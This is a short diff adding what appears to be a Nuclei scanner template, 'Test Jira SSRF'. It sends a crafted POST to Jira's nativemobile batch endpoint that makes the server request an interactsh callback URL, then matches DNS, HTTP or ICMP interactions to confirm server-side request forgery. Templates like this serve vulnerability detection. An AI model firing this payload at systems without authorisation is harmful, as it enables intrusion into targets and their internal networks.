@@ -1,0 +1,24 @@
+id: SeekerX-Jira-SSRF
+
+info:
+  name: Test Jira SSRF
+  author: LOL
+  severity: Medium
+
+requests:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /rest/nativemobile/1.0/batch HTTP/1.1
+        Host: {{Hostname}}
+        content-type: application/json
+
+        {"requests":[{"method":"GET","location":"@{{interactsh-url}}"}]}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol 
+        words:
+          - "dns"
+          - "http"
+          - "icmp"
